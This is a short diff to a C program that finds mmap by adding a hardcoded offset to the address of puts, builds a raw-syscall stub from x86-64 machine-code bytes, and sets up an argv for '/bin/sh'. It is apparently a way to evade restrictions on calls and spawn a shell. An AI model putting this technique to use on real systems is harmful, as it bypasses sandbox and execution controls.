@@ -4,7 +4,7 @@
 #include <sys/mman.h>
 
 union notmmap_build {
-  void *(*basefn)(size_t);
+  int (*basefn)(const char *);
   size_t addr;
   void *(*fn)(void *addr, size_t length, int prot, int flags, int fd,
               off_t offset);
@@ -20,7 +20,7 @@ union notsyscall_build {
   Name.addr = Name.addr Offset;
 
 int main(void) {
-  BUILD(notmmap, malloc, -921495)
+  BUILD(notmmap, puts, +1905)
 
   char *argv[] = {
       "/bin/sh",
@@ -30,12 +30,12 @@ int main(void) {
   };
 
   // clang-format off
-  char instructions[] = {
+  unsigned char instructions[] = {
       // notsyscall: translate System V C ABI to Linux syscall ABI
-     	0x48, 0x89, 0xf8,   // mov    %rdi,%rax
-     	0x48, 0x89, 0xf7,   // mov    %rsi,%rdi
-     	0x48, 0x89, 0xd6,   // mov    %rdx,%rsi
-     	0x48, 0x89, 0xca,   // mov    %rcx,%rdx
+      0x48, 0x89, 0xf8,   // mov    %rdi,%rax
+      0x48, 0x89, 0xf7,   // mov    %rsi,%rdi
+      0x48, 0x89, 0xd6,   // mov    %rdx,%rsi
+      0x48, 0x89, 0xca,   // mov    %rcx,%rdx
       0x0f, 0x05,         // syscall
       0xc3,               // ret
   };
